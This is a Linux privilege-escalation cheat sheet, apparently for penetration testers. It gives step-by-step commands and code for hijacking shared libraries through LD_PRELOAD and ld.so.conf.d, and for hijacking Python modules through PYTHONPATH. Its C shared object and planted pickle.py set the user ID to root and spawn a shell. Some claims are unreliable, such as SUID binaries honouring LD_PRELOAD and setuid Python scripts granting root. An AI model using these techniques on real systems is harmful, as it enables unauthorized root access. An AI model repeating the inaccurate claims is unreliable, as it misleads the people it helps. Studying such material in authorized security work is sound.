### LD_PRELOAD & Shared Library Hijacking
1. **Find Binaries That Honor LD_PRELOAD (Including SUID)**
```bash
find / -perm -4000 -type f 2>/dev/null | while read -r bin; do
  echo "[*] Checking $bin"
  ldd "$bin" 2>/dev/null | grep "=>" && echo "[+] $bin loads shared libs"
done
```
2. **Create a Malicious Shared Object**
```bash
// exploit.c
#include <unistd.h>
void __attribute__((constructor)) init() {
    setuid(0);
    setgid(0);
    system("/bin/sh");
}
```
```bash
gcc -shared -fPIC -o /tmp/exploit.so exploit.c
```
3. **Preload & Execute the SUID Binary**
```bash
export LD_PRELOAD=/tmp/exploit.so
/path/to/suid_binary
```
- If the binary loads `libc` or another library, your `exploit.so` runs as root.
4. **Modify `/etc/ld.so.conf.d` if Writable**
```bash
echo "/home/user/mylibs" > /etc/ld.so.conf.d/malicious.conf
ldconfig
```
- Place your `.so` in `/home/user/mylibs` and run the vulnerable binary.
### Python Module Hijacking
1. **Locate SUID Python Scripts**
```bash
find / -perm -4000 -type f | grep "\.py$" 2>/dev/null
```
2. Create malicious python module
```bash
mkdir -p /tmp/malicious
cat << 'EOF' > /tmp/malicious/pickle.py
import os
os.setuid(0)
os.system("/bin/sh")
EOF
```
3. Set PYTHONPATH and Run the Script
```bash
export PYTHONPATH=/tmp/malicious:$PYTHONPATH
/usr/bin/vulnerable_suid_script.py
```
- If `vulnerable_suid_script.py` does `import pickle` (or another module you control), it spawns a root shell.